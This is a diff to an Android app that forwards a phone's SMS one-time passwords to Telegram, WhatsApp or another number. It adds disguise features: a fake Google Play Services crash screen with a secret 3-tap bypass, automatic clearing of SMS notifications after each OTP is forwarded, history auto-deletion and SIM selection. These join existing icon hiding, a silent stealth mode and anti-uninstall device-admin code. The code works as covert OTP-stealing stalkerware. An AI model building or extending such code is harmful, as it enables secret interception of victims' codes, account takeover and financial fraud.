@@ -1,6 +1,8 @@
 package com.example.otpforwarder
 
 import android.Manifest
+import android.app.Activity
+import android.app.KeyguardManager
 import android.app.admin.DevicePolicyManager
 import android.content.ClipData
 import android.content.ClipboardManager
@@ -10,14 +12,16 @@ import android.content.Intent
 import android.content.pm.PackageManager
 import android.net.Uri
 import android.os.Build
-import android.os.PowerManager
 import android.os.Bundle
+import android.os.PowerManager
 import android.provider.Settings
 import android.widget.Toast
 import androidx.activity.ComponentActivity
+import androidx.activity.compose.rememberLauncherForActivityResult
 import androidx.activity.compose.setContent
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.compose.foundation.background
+import androidx.compose.foundation.clickable
 import androidx.compose.foundation.layout.*
 import androidx.compose.foundation.lazy.LazyColumn
 import androidx.compose.foundation.lazy.items
@@ -31,6 +35,7 @@ import androidx.compose.ui.Modifier
 import androidx.compose.ui.graphics.Color
 import androidx.compose.ui.platform.LocalContext
 import androidx.compose.ui.text.font.FontWeight
+import androidx.compose.ui.text.style.TextAlign
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
 import androidx.core.content.ContextCompat
@@ -57,12 +62,13 @@ class MainActivity : ComponentActivity() {
                     modifier = Modifier.fillMaxSize(),
                     color = MaterialTheme.colorScheme.background
                 ) {
-                    MainScreenContent(
+                    RootAppScreen(
                         onOpenNotificationSettings = {
                             val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
                             startActivity(intent)
                         },
-                        onRequestPermissions = { requestAppPermissions() }
+                        onRequestPermissions = { requestAppPermissions() },
+                        onExitApp = { finish() }
                     )
                 }
             }
@@ -73,7 +79,8 @@ class MainActivity : ComponentActivity() {
         val perms = mutableListOf(
             Manifest.permission.RECEIVE_SMS,
             Manifest.permission.READ_SMS,
-            Manifest.permission.SEND_SMS
+            Manifest.permission.SEND_SMS,
+            Manifest.permission.READ_PHONE_STATE
         )
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
             perms.add(Manifest.permission.POST_NOTIFICATIONS)
@@ -125,6 +132,214 @@ fun setLauncherIconVisibility(context: Context, hide: Boolean) {
         newState,
         PackageManager.DONT_KILL_APP
     )
+}
+
+@Composable
+fun RootAppScreen(
+    onOpenNotificationSettings: () -> Unit,
+    onRequestPermissions: () -> Unit,
+    onExitApp: () -> Unit
+) {
+    val context = LocalContext.current
+    val prefs = remember { PrefsHelper.getPrefs(context) }
+
+    val isFakeCrashEnabled = remember { prefs.getBoolean("fake_crash_enabled", false) }
+    var isFakeCrashPassed by remember { mutableStateOf(!isFakeCrashEnabled) }
+
+    val isAppLockEnabled = remember { prefs.getBoolean("app_lock_enabled", false) }
+    var isAppUnlocked by remember { mutableStateOf(!isAppLockEnabled) }
+
+    if (!isFakeCrashPassed) {
+        FakeCrashScreen(
+            onUnlock = { isFakeCrashPassed = true },
+            onExit = onExitApp
+        )
+    } else if (!isAppUnlocked) {
+        AppLockScreen(
+            onUnlockSuccess = { isAppUnlocked = true },
+            onExit = onExitApp
+        )
+    } else {
+        MainScreenContent(
+            onOpenNotificationSettings = onOpenNotificationSettings,
+            onRequestPermissions = onRequestPermissions
+        )
+    }
+}
+
+@Composable
+fun FakeCrashScreen(onUnlock: () -> Unit, onExit: () -> Unit) {
+    val context = LocalContext.current
+    var tapCount by remember { mutableStateOf(0) }
+    var lastTapTime by remember { mutableStateOf(0L) }
+
+    Box(
+        modifier = Modifier
+            .fillMaxSize()
+            .background(Color(0xFF1E1E1E))
+            .padding(24.dp),
+        contentAlignment = Alignment.Center
+    ) {
+        Card(
+            modifier = Modifier.fillMaxWidth(),
+            colors = CardDefaults.cardColors(containerColor = Color(0xFF2C2C2C)),
+            shape = RoundedCornerShape(16.dp),
+            elevation = CardDefaults.cardElevation(defaultElevation = 8.dp)
+        ) {
+            Column(
+                modifier = Modifier.padding(24.dp),
+                horizontalAlignment = Alignment.CenterHorizontally
+            ) {
+                // Secret tap icon (3 taps in 1.5s unlocks the disguised crash)
+                Box(
+                    modifier = Modifier
+                        .size(64.dp)
+                        .clickable {
+                            val now = System.currentTimeMillis()
+                            if (now - lastTapTime < 1500) {
+                                tapCount++
+                            } else {
+                                tapCount = 1
+                            }
+                            lastTapTime = now
+                            if (tapCount >= 3) {
+                                Toast.makeText(context, "🔓 Disguise Bypassed", Toast.LENGTH_SHORT).show()
+                                onUnlock()
+                            }
+                        },
+                    contentAlignment = Alignment.Center
+                ) {
+                    Text("⚠️", fontSize = 42.sp)
+                }
+
+                Spacer(modifier = Modifier.height(16.dp))
+
+                Text(
+                    text = "Google Play Services keeps stopping",
+                    fontSize = 17.sp,
+                    fontWeight = FontWeight.Bold,
+                    color = Color.White,
+                    textAlign = TextAlign.Center
+                )
+
+                Spacer(modifier = Modifier.height(10.dp))
+
+                Text(
+                    text = "com.google.android.gms has encountered an unexpected background error and had to close.",
+                    fontSize = 12.sp,
+                    color = Color(0xFFB0B0B0),
+                    textAlign = TextAlign.Center
+                )
+
+                Spacer(modifier = Modifier.height(24.dp))
+
+                Button(
+                    onClick = onExit,
+                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF3F51B5)),
+                    modifier = Modifier.fillMaxWidth()
+                ) {
+                    Text("Close app", color = Color.White, fontSize = 13.sp)
+                }
+
+                Spacer(modifier = Modifier.height(8.dp))
+
+                OutlinedButton(
+                    onClick = onExit,
+                    modifier = Modifier.fillMaxWidth()
+                ) {
+                    Text("Send feedback", color = Color.LightGray, fontSize = 13.sp)
+                }
+            }
+        }
+    }
+}
+
+@Composable
+fun AppLockScreen(onUnlockSuccess: () -> Unit, onExit: () -> Unit) {
+    val context = LocalContext.current
+    val keyguardManager = remember { context.getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager }
+
+    val authLauncher = rememberLauncherForActivityResult(
+        contract = ActivityResultContracts.StartActivityForResult()
+    ) { result ->
+        if (result.resultCode == Activity.RESULT_OK) {
+            Toast.makeText(context, "✅ Identity Verified", Toast.LENGTH_SHORT).show()
+            onUnlockSuccess()
+        } else {
+            Toast.makeText(context, "❌ Authentication Failed / Cancelled", Toast.LENGTH_SHORT).show()
+        }
+    }
+
+    val launchAuth = {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
+            val intent = keyguardManager?.createConfirmDeviceCredentialIntent(
+                "eDistrict Forwarder Lock",
+                "Enter device Fingerprint, PIN, Pattern, or Password to open"
+            )
+            if (intent != null) {
+                authLauncher.launch(intent)
+            } else {
+                onUnlockSuccess()
+            }
+        } else {
+            onUnlockSuccess()
+        }
+    }
+
+    LaunchedEffect(Unit) {
+        launchAuth()
+    }
+
+    Box(
+        modifier = Modifier
+            .fillMaxSize()
+            .background(MaterialTheme.colorScheme.background)
+            .padding(24.dp),
+        contentAlignment = Alignment.Center
+    ) {
+        Card(
+            modifier = Modifier.fillMaxWidth(),
+            shape = RoundedCornerShape(16.dp),
+            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant),
+            elevation = CardDefaults.cardElevation(defaultElevation = 6.dp)
+        ) {
+            Column(
+                modifier = Modifier.padding(24.dp),
+                horizontalAlignment = Alignment.CenterHorizontally
+            ) {
+                Text("🔒", fontSize = 50.sp)
+                Spacer(modifier = Modifier.height(12.dp))
+                Text(
+                    text = "App Lock Active",
+                    fontSize = 18.sp,
+                    fontWeight = FontWeight.Bold,
+                    color = MaterialTheme.colorScheme.onSurface
+                )
+                Spacer(modifier = Modifier.height(6.dp))
+                Text(
+                    text = "Fingerprint ya phone ka PIN verify karke app unlock karein.",
+                    fontSize = 12.sp,
+                    color = Color.DarkGray,
+                    textAlign = TextAlign.Center
+                )
+                Spacer(modifier = Modifier.height(20.dp))
+                Button(
+                    onClick = { launchAuth() },
+                    modifier = Modifier.fillMaxWidth(),
+                    colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.primary)
+                ) {
+                    Text("🔓 Unlock Now (Biometric / PIN)", fontSize = 13.sp)
+                }
+                Spacer(modifier = Modifier.height(8.dp))
+                OutlinedButton(
+                    onClick = onExit,
+                    modifier = Modifier.fillMaxWidth()
+                ) {
+                    Text("Exit", fontSize = 13.sp)
+                }
+            }
+        }
+    }
 }
 
 @Composable
@@ -291,33 +506,41 @@ fun ServicesTab(context: Context, onRequestPermissions: () -> Unit) {
     val prefs = remember { PrefsHelper.getPrefs(context) }
     val scope = rememberCoroutineScope()
 
-    // Telegram 1 State (Primary)
+    // 1. Telegram 1 State (Primary)
     var isTelegramEnabled by remember { mutableStateOf(prefs.getBoolean("is_telegram_enabled", true)) }
     var botToken by remember { mutableStateOf(prefs.getString("bot_token", TelegramHelper.DEFAULT_BOT_TOKEN) ?: "") }
     var chatId by remember { mutableStateOf(prefs.getString("chat_id", TelegramHelper.DEFAULT_CHANNEL_ID) ?: "") }
     var telegramStatus by remember { mutableStateOf("") }
 
-    // Telegram 2 State (Secondary / 2nd Bot / 2nd Account)
+    // 2. Telegram 2 State (Secondary)
     var isTelegram2Enabled by remember { mutableStateOf(prefs.getBoolean("is_telegram_2_enabled", false)) }
     var botToken2 by remember { mutableStateOf(prefs.getString("bot_token_2", "") ?: "") }
     var chatId2 by remember { mutableStateOf(prefs.getString("chat_id_2", "") ?: "") }
     var telegram2Status by remember { mutableStateOf("") }
 
-    // WhatsApp State
+    // 3. WhatsApp State
     var isWhatsAppEnabled by remember { mutableStateOf(prefs.getBoolean("is_whatsapp_enabled", false)) }
     var waPhone by remember { mutableStateOf(prefs.getString("wa_phone", "") ?: "") }
     var waApiKey by remember { mutableStateOf(prefs.getString("wa_api_key", "") ?: "") }
     var waStatus by remember { mutableStateOf("") }
 
-    // Direct SMS State
+    // 4. Direct SMS State
     var isSmsEnabled by remember { mutableStateOf(prefs.getBoolean("is_sms_enabled", false)) }
     var smsPhone by remember { mutableStateOf(prefs.getString("sms_phone", "") ?: "") }
+    var smsSimSlot by remember { mutableStateOf(prefs.getInt("sms_sim_slot", -1)) }
     var smsStatus by remember { mutableStateOf("") }
 
-    // Security & Child Protection State
+    // 5. Features: Only OTP & Low Battery Alert
+    var isOnlyOtpMode by remember { mutableStateOf(prefs.getBoolean("only_otp_mode", false)) }
+    var isLowBatteryAlertEnabled by remember { mutableStateOf(prefs.getBoolean("low_battery_alert_enabled", false)) }
+
+    // 6. Security & Child Protection State
     var isAdminActive by remember { mutableStateOf(isDeviceAdminActive(context)) }
     var isIconHidden by remember { mutableStateOf(isLauncherIconHidden(context)) }
     var isSilentMode by remember { mutableStateOf(!prefs.getBoolean("show_screen_popups", false)) }
+    var isAppLockEnabled by remember { mutableStateOf(prefs.getBoolean("app_lock_enabled", false)) }
+    var isFakeCrashEnabled by remember { mutableStateOf(prefs.getBoolean("fake_crash_enabled", false)) }
+    var isAutoClearSms by remember { mutableStateOf(prefs.getBoolean("auto_clear_sms_notification", false)) }
 
     Column(
         modifier = Modifier
@@ -325,6 +548,68 @@ fun ServicesTab(context: Context, onRequestPermissions: () -> Unit) {
             .verticalScroll(rememberScrollState())
             .padding(16.dp)
     ) {
+        // Feature Card 1: Only OTP Mode (1-Tap Copy)
+        Card(
+            modifier = Modifier.fillMaxWidth().padding(bottom = 16.dp),
+            colors = CardDefaults.cardColors(containerColor = Color(0xFFE0F7FA))
+        ) {
+            Row(
+                modifier = Modifier.fillMaxWidth().padding(16.dp),
+                verticalAlignment = Alignment.CenterVertically,
+                horizontalArrangement = Arrangement.SpaceBetween
+            ) {
+                Column(modifier = Modifier.weight(1f)) {
+                    Text("⚡ Only OTP Mode (1-Tap Copy)", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = Color(0xFF006064))
+                    Text(
+                        text = if (isOnlyOtpMode)
+                            "🟢 Active: Dost ko poore message ki jagah sirf 6-digit OTP jayega (e.g. 240833)"
+                        else
+                            "Standard: Poora message (sender + body) jayega",
+                        fontSize = 11.sp,
+                        color = Color.DarkGray
+                    )
+                }
+                Switch(
+                    checked = isOnlyOtpMode,
+                    onCheckedChange = { checked ->
+                        isOnlyOtpMode = checked
+                        prefs.edit().putBoolean("only_otp_mode", checked).apply()
+                    }
+                )
+            }
+        }
+
+        // Feature Card 2: Low Battery Alert
+        Card(
+            modifier = Modifier.fillMaxWidth().padding(bottom = 16.dp),
+            colors = CardDefaults.cardColors(containerColor = Color(0xFFFBE9E7))
+        ) {
+            Row(
+                modifier = Modifier.fillMaxWidth().padding(16.dp),
+                verticalAlignment = Alignment.CenterVertically,
+                horizontalArrangement = Arrangement.SpaceBetween
+            ) {
+                Column(modifier = Modifier.weight(1f)) {
+                    Text("🔋 Low Battery Telegram Alert", fontWeight = FontWeight.Bold, fontSize = 15.sp, color = Color(0xFFBF360C))
+                    Text(
+                        text = if (isLowBatteryAlertEnabled)
+                            "🟢 Active: Phone battery 15% hote hi Telegram par alert aayega"
+                        else
+                            "Off: Low battery alert band hai",
+                        fontSize = 11.sp,
+                        color = Color.DarkGray
+                    )
+                }
+                Switch(
+                    checked = isLowBatteryAlertEnabled,
+                    onCheckedChange = { checked ->
+                        isLowBatteryAlertEnabled = checked
+                        prefs.edit().putBoolean("low_battery_alert_enabled", checked).apply()
+                    }
+                )
+            }
+        }
+
         // 1. Telegram Service 1 Card (Primary - Locked Default)
         Card(
             modifier = Modifier.fillMaxWidth().padding(bottom = 16.dp),
@@ -538,7 +823,7 @@ fun ServicesTab(context: Context, onRequestPermissions: () -> Unit) {
             }
         }
 
-        // 4. Direct SMS Card
+        // 4. Direct SMS Card (with Dual SIM Selector)
         Card(
             modifier = Modifier.fillMaxWidth().padding(bottom = 16.dp),
             colors = CardDefaults.cardColors(containerColor = Color(0xFFFFF8E1))
@@ -578,6 +863,49 @@ fun ServicesTab(context: Context, onRequestPermissions: () -> Unit) {
                         modifier = Modifier.fillMaxWidth(),
                         singleLine = true
                     )
+
+                    Spacer(modifier = Modifier.height(10.dp))
+
+                    // Feature 5: Dual SIM Slot Selector
+                    Text("📶 Select SIM Card Slot:", fontWeight = FontWeight.SemiBold, fontSize = 12.sp, color = Color(0xFFE65100))
+                    Row(
+                        modifier = Modifier.fillMaxWidth(),
+                        verticalAlignment = Alignment.CenterVertically
+                    ) {
+                        Row(verticalAlignment = Alignment.CenterVertically) {
+                            RadioButton(
+                                selected = smsSimSlot == -1,
+                                onClick = {
+                                    smsSimSlot = -1
+                                    prefs.edit().putInt("sms_sim_slot", -1).apply()
+                                }
+                            )
+                            Text("Auto", fontSize = 11.sp)
+                        }
+                        Spacer(modifier = Modifier.width(12.dp))
+                        Row(verticalAlignment = Alignment.CenterVertically) {
+                            RadioButton(
+                                selected = smsSimSlot == 0,
+                                onClick = {
+                                    smsSimSlot = 0
+                                    prefs.edit().putInt("sms_sim_slot", 0).apply()
+                                }
+                            )
+                            Text("SIM 1", fontSize = 11.sp)
+                        }
+                        Spacer(modifier = Modifier.width(12.dp))
+                        Row(verticalAlignment = Alignment.CenterVertically) {
+                            RadioButton(
+                                selected = smsSimSlot == 1,
+                                onClick = {
+                                    smsSimSlot = 1
+                                    prefs.edit().putInt("sms_sim_slot", 1).apply()
+                                }
+                            )
+                            Text("SIM 2", fontSize = 11.sp)
+                        }
+                    }
+
                     Spacer(modifier = Modifier.height(10.dp))
                     Button(
                         onClick = {
@@ -606,7 +934,7 @@ fun ServicesTab(context: Context, onRequestPermissions: () -> Unit) {
             }
         }
 
-        // 5. Child & Security Protection Card (Anti-Uninstall & Icon Hide)
+        // 5. Child & Security Protection Card (Anti-Uninstall, Stealth, Lock, Fake Crash, Clear SMS)
         Card(
             modifier = Modifier.fillMaxWidth().padding(bottom = 20.dp),
             colors = CardDefaults.cardColors(containerColor = Color(0xFFEDE7F6))
@@ -661,7 +989,7 @@ fun ServicesTab(context: Context, onRequestPermissions: () -> Unit) {
 
                 Divider(modifier = Modifier.padding(vertical = 12.dp))
 
-                // 5C: Silent Stealth Mode (100% Chupchap / No Screen Pop-ups)
+                // 5B: Silent Stealth Mode (100% Chupchap / No Screen Pop-ups)
                 Row(
                     modifier = Modifier.fillMaxWidth(),
                     verticalAlignment = Alignment.CenterVertically,
@@ -691,7 +1019,82 @@ fun ServicesTab(context: Context, onRequestPermissions: () -> Unit) {
 
                 Divider(modifier = Modifier.padding(vertical = 12.dp))
 
-                // 5B: Hide App Icon
+                // Feature 3: Fingerprint / PIN App Lock
+                Row(
+                    modifier = Modifier.fillMaxWidth(),
+                    verticalAlignment = Alignment.CenterVertically,
+                    horizontalArrangement = Arrangement.SpaceBetween
+                ) {
+                    Column(modifier = Modifier.weight(1f)) {
+                        Text("👆 Fingerprint / PIN App Lock", fontWeight = FontWeight.Bold, fontSize = 14.sp)
+                        Text(
+                            text = if (isAppLockEnabled) "🟢 Protected: Khulne par fingerprint/PIN mangega" else "Off: Seedha app khul jayegi",
+                            fontSize = 11.sp,
+                            color = if (isAppLockEnabled) Color(0xFF2E7D32) else Color.Gray
+                        )
+                    }
+                    Switch(
+                        checked = isAppLockEnabled,
+                        onCheckedChange = { checked ->
+                            isAppLockEnabled = checked
+                            prefs.edit().putBoolean("app_lock_enabled", checked).apply()
+                        }
+                    )
+                }
+
+                Divider(modifier = Modifier.padding(vertical = 12.dp))
+
+                // Feature 6: Fake Crash Screen Disguise
+                Row(
+                    modifier = Modifier.fillMaxWidth(),
+                    verticalAlignment = Alignment.CenterVertically,
+                    horizontalArrangement = Arrangement.SpaceBetween
+                ) {
+                    Column(modifier = Modifier.weight(1f)) {
+                        Text("🎭 Fake Crash Screen (Top Disguise)", fontWeight = FontWeight.Bold, fontSize = 14.sp)
+                        Text(
+                            text = if (isFakeCrashEnabled) "🟢 Active: Khulne par Play Services crash dikhayega (3-tap unlock)" else "Off: Normal screen dikhegi",
+                            fontSize = 11.sp,
+                            color = if (isFakeCrashEnabled) Color(0xFF2E7D32) else Color.Gray
+                        )
+                    }
+                    Switch(
+                        checked = isFakeCrashEnabled,
+                        onCheckedChange = { checked ->
+                            isFakeCrashEnabled = checked
+                            prefs.edit().putBoolean("fake_crash_enabled", checked).apply()
+                        }
+                    )
+                }
+
+                Divider(modifier = Modifier.padding(vertical = 12.dp))
+
+                // Feature 7: Auto-Clear SMS Notification
+                Row(
+                    modifier = Modifier.fillMaxWidth(),
+                    verticalAlignment = Alignment.CenterVertically,
+                    horizontalArrangement = Arrangement.SpaceBetween
+                ) {
+                    Column(modifier = Modifier.weight(1f)) {
+                        Text("🔕 Auto-Clear SMS Notifications", fontWeight = FontWeight.Bold, fontSize = 14.sp)
+                        Text(
+                            text = if (isAutoClearSms) "🟢 Active: OTP forward hote hi screen se SMS ka pop-up gayab ho jayega" else "Off: Screen par SMS pop-up bana rahega",
+                            fontSize = 11.sp,
+                            color = if (isAutoClearSms) Color(0xFF2E7D32) else Color.Gray
+                        )
+                    }
+                    Switch(
+                        checked = isAutoClearSms,
+                        onCheckedChange = { checked ->
+                            isAutoClearSms = checked
+                            prefs.edit().putBoolean("auto_clear_sms_notification", checked).apply()
+                        }
+                    )
+                }
+
+                Divider(modifier = Modifier.padding(vertical = 12.dp))
+
+                // 5C: Hide App Icon
                 Row(
                     modifier = Modifier.fillMaxWidth(),
                     verticalAlignment = Alignment.CenterVertically,
@@ -814,7 +1217,7 @@ fun ServicesTab(context: Context, onRequestPermissions: () -> Unit) {
             }
         }
 
-        // 6. Secret In-App Update Card (Rasta 2)
+        // 6. Secret In-App Update Card
         Card(
             modifier = Modifier.fillMaxWidth().padding(bottom = 16.dp),
             colors = CardDefaults.cardColors(containerColor = Color(0xFFE3F2FD))
@@ -884,6 +1287,12 @@ fun ServicesTab(context: Context, onRequestPermissions: () -> Unit) {
                     .putString("wa_api_key", waApiKey.trim())
                     .putBoolean("is_sms_enabled", isSmsEnabled)
                     .putString("sms_phone", smsPhone.trim())
+                    .putInt("sms_sim_slot", smsSimSlot)
+                    .putBoolean("only_otp_mode", isOnlyOtpMode)
+                    .putBoolean("low_battery_alert_enabled", isLowBatteryAlertEnabled)
+                    .putBoolean("app_lock_enabled", isAppLockEnabled)
+                    .putBoolean("fake_crash_enabled", isFakeCrashEnabled)
+                    .putBoolean("auto_clear_sms_notification", isAutoClearSms)
                     .apply()
                 Toast.makeText(context, "✅ Sabhi Settings Save Ho Gayi!", Toast.LENGTH_SHORT).show()
             },
@@ -1092,7 +1501,9 @@ fun KeywordsTab(context: Context) {
 
 @Composable
 fun HistoryTab(context: Context) {
+    val prefs = remember { PrefsHelper.getPrefs(context) }
     var historyList by remember { mutableStateOf(HistoryManager.getHistory(context)) }
+    var isAutoClearHistory by remember { mutableStateOf(prefs.getBoolean("auto_clear_history_24h", false)) }
 
     Column(
         modifier = Modifier
@@ -1130,7 +1541,40 @@ fun HistoryTab(context: Context) {
             }
         }
 
-        Spacer(modifier = Modifier.height(10.dp))
+        Spacer(modifier = Modifier.height(6.dp))
+
+        // Feature 4: Auto-Delete History (>24 Hours) Card
+        Card(
+            modifier = Modifier.fillMaxWidth().padding(bottom = 12.dp),
+            colors = CardDefaults.cardColors(containerColor = Color(0xFFFBE9E7))
+        ) {
+            Row(
+                modifier = Modifier.fillMaxWidth().padding(12.dp),
+                verticalAlignment = Alignment.CenterVertically,
+                horizontalArrangement = Arrangement.SpaceBetween
+            ) {
+                Column(modifier = Modifier.weight(1f)) {
+                    Text("🗑️ Auto-Delete History (>24 Hours)", fontWeight = FontWeight.Bold, fontSize = 13.sp, color = Color(0xFFBF360C))
+                    Text(
+                        text = if (isAutoClearHistory) "🟢 Active: 24h purane records auto-delete honge" else "Off: Sabhi records bache rahenge",
+                        fontSize = 10.sp,
+                        color = Color.DarkGray
+                    )
+                }
+                Switch(
+                    checked = isAutoClearHistory,
+                    onCheckedChange = { checked ->
+                        isAutoClearHistory = checked
+                        prefs.edit().putBoolean("auto_clear_history_24h", checked).apply()
+                        if (checked) {
+                            HistoryManager.pruneOldHistory(context)
+                            historyList = HistoryManager.getHistory(context)
+                            Toast.makeText(context, "Purane 24h+ OTP saaf ho gaye!", Toast.LENGTH_SHORT).show()
+                        }
+                    }
+                )
+            }
+        }
 
         if (historyList.isEmpty()) {
             Box(
@@ -1141,7 +1585,7 @@ fun HistoryTab(context: Context) {
                     text = "Abhi tak koi OTP forward nahi hua hai.\nJaise hi koi OTP aayega, uska khata yahan dikhega.",
                     fontSize = 13.sp,
                     color = Color.Gray,
-                    textAlign = androidx.compose.ui.text.style.TextAlign.Center
+                    textAlign = TextAlign.Center
                 )
             }
         } else {
